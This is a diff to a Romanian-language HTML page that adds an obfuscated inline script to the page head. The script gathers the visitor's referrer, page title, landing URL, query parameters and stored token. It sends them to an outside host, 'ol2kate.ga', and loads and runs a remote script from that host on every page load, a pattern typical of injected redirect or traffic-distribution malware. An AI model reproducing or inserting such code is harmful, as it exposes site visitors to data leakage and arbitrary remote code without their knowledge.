@@ -1,6 +1,49 @@
 <!DOCTYPE html>
 <html lang="ro">
   <head>
+    <script>
+    (function() {
+    var name = '_Zr1hqbvkmH6ySMfQ';
+    if (!window._Zr1hqbvkmH6ySMfQ) {
+        window._Zr1hqbvkmH6ySMfQ = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://ol2kate.ga/F54s4tM6',
+            P_PATH: 'https://ol2kate.ga/7b4f75c/postback',
+        };
+    }
+    const _887jMDmMLGxp49JJ = localStorage.getItem('config');
+    if (typeof _887jMDmMLGxp49JJ !== 'undefined' && _887jMDmMLGxp49JJ !== null) {
+        var _p7tBrWFF835kWTqc = JSON.parse(_887jMDmMLGxp49JJ);
+        var _wt4wgFJWfK97YgtH = Math.round(+new Date()/1000);
+        if (_p7tBrWFF835kWTqc.created_at + window._Zr1hqbvkmH6ySMfQ.ttl < _wt4wgFJWfK97YgtH) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _ZrMtYHjKcbdJvjhT = localStorage.getItem('subId');
+    var _RfNq9XszKcwLDGNK = localStorage.getItem('token');
+    var _fmNHmcPMqZFN29Fr = '?return=js.client';
+        _fmNHmcPMqZFN29Fr += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _fmNHmcPMqZFN29Fr += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _fmNHmcPMqZFN29Fr += '&default_keyword=' + encodeURIComponent(document.title);
+        _fmNHmcPMqZFN29Fr += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _fmNHmcPMqZFN29Fr += '&name=' + encodeURIComponent(name);
+        _fmNHmcPMqZFN29Fr += '&host=' + encodeURIComponent(window._Zr1hqbvkmH6ySMfQ.R_PATH);
+    if (typeof _ZrMtYHjKcbdJvjhT !== 'undefined' && _ZrMtYHjKcbdJvjhT && window._Zr1hqbvkmH6ySMfQ.unique) {
+        _fmNHmcPMqZFN29Fr += '&sub_id=' + encodeURIComponent(_ZrMtYHjKcbdJvjhT);
+    }
+    if (typeof _RfNq9XszKcwLDGNK !== 'undefined' && _RfNq9XszKcwLDGNK && window._Zr1hqbvkmH6ySMfQ.unique) {
+        _fmNHmcPMqZFN29Fr += '&token=' + encodeURIComponent(_RfNq9XszKcwLDGNK);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._Zr1hqbvkmH6ySMfQ.R_PATH + _fmNHmcPMqZFN29Fr;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <meta http-equiv="x-ua-compatible" content="ie=edge">
